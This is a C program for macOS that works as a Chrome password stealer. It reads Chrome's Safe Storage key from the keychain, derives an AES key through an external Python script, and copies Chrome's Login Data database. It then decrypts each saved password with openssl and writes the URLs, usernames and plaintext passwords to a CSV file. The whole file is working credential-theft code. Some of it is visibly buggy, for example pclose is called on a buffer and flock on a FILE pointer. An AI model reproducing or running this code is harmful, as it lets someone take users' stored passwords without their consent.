#include<stdio.h>
#include<string.h>
#include <sqlite3.h>
#include <stdlib.h>
#include <sys/file.h>
#include <unistd.h>

int initial_csv = 0;

struct user_info {
    char * url;
    char * username;
    char * password;
};

void safe_chrome_secure(char * out)
{
    FILE * fsecure = popen("security find-generic-password -wa 'Chrome'", "r");
    char key_storage[128];
    while (fgets(key_storage, sizeof(key_storage), fsecure) != 0)
    {
    }
    strcpy(out, key_storage);
    pclose(fsecure);
}

void pbkdf2_hmac(char * out)
{
    char key_storage[256];
    safe_chrome_secure(key_storage);
    printf("Key : %s\n\r", key_storage);

    char command[256];
    sprintf(command, "python ../pbkdf2_hmac.py %s", key_storage);

    FILE * f_pbkdf2_hmac = popen(command, "r");
    char buffer[128];
    while (fgets(buffer, sizeof(buffer), f_pbkdf2_hmac) != 0)
    {
    }

    strcpy(out, buffer);
    pclose(buffer);

}

void base64(char * out, char * encoded)
{
    char encbase64[256];
    sprintf(encbase64, "echo \"%s\" | openssl enc -base64", &encoded[3]);

    FILE * fbase64 = popen(encbase64, "r");
    char buffer[256];
    memset(buffer, '\0', sizeof(buffer));
    while (fgets(buffer, sizeof(buffer), fbase64) != 0)
    {
    }
    strtok(buffer, "\n");
    strcpy(out, buffer);
    pclose(fbase64);
}

void chrome_decript(char * out, char * encoded, char * key)
{
    char * iv = "20202020202020202020202020202020";

    //char * hex_enc_password = "XE66Q9SD5OyShCz53DWcuQ==";
    char hex_enc_password[256];
    base64(hex_enc_password, encoded);

    strtok(key, "\n");
    strtok(hex_enc_password, "\n");

    char command[256];
    sprintf(command, "openssl enc -base64 -d -aes-128-cbc -iv '%s' -K %s <<< %s 2>/dev/null", iv, key, hex_enc_password);

    FILE * fdecrypt = popen(command, "r");
    char buffer[256];
    while (fgets(buffer, sizeof(buffer), fdecrypt) != 0)
    {
    }
    strcpy(out, buffer);
    pclose(fdecrypt);
}

// Adding line to the CSV File
static void save_data(struct user_info *parent_)
{
    char *filename = "Chrome_data.csv";

    FILE *fp;

    // Lock file
    flock(fp, LOCK_SH);

    // Opening File Mode : Initial or Append
    if(initial_csv == 0)
    {
        printf("\nCreating %s file",filename);

        fp=fopen(filename,"w+");
        fprintf(fp,"Url; User; Password;");

        initial_csv = 1;
    } else
    {
        fp=fopen(filename,"a");
    }

    printf("\nAdding data...");
    // Adding line information
    fprintf(fp,"\n%s;%s;%s ",parent_->url, parent_->username, parent_->password);

    fclose(fp);
    // Release locked file
    flock(fp, LOCK_UN);
}


static int callback(void * data, int argc, char **argv, char **azColName)
{
    struct user_info * parent_;
    parent_ = (struct user_info*) malloc(sizeof(struct user_info));

    char * key = (char *)data;
    for(int i = 0; i < argc; i++)
    {
        if(strcmp(azColName[i], "password_value") == 0)
        {
            char password[256];
            if (strlen(argv[i]) > 0)
            {
                chrome_decript(password, argv[i], key);
            }

            password[strlen(password)-1] = '\0';

            parent_->password = password;

            // Adding Quote to the text
            char passwordFormat[256];
            sprintf(passwordFormat, "\"%s\"", password);
            parent_->password = strcmp(argv[i], "") ? passwordFormat : "NULL";
        }
        else if(strcmp(azColName[i], "origin_url") == 0)
        {
            char urlFormat[256];
            sprintf(urlFormat, "\"%s\"", argv[i]);
            parent_->url = strcmp(argv[i], "") ? urlFormat : "NULL";
        }
        else if(strcmp(azColName[i], "username_value") == 0)
        {
            char usernameFormat[256];
            sprintf(usernameFormat, "\"%s\"", argv[i]);
            parent_->username = strcmp(argv[i], "") ? usernameFormat : "NULL";
        }
    }

    // Adding only valid Username & Password
    if((strcmp(parent_->username, "NULL")) && (strcmp(parent_->password, "NULL")))
    {
        save_data(parent_);
    }

    return 0;
}

int main()
{
    sqlite3 * db;

    char * zErrMsg = 0;

    int rc;

    char * sql;

    char key[128];
    pbkdf2_hmac(key);

    // Copy file Logindata
    printf("Search databases...\n");
    system("cp ~/Library/Application\\ Support/Google/Chrome/Default/Login\\ Data ./login_chrome");

    rc = sqlite3_open_v2("./login_chrome", &db, SQLITE_OPEN_READONLY, NULL);

    if( rc != SQLITE_OK) {
        fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
        return EXIT_FAILURE;
    }

    printf("Loading data...\n");
    // Create SQL statement
    sql = "SELECT * FROM 'logins'";

    // Execute SQL statement
    rc = sqlite3_exec(db, sql, callback, (void*)key, &zErrMsg);

    if( rc != SQLITE_OK ) {
        fprintf(stderr, "SQL error: %s\n", zErrMsg);
        sqlite3_free(zErrMsg);
    }

    sqlite3_close(db);

    return  EXIT_SUCCESS;
}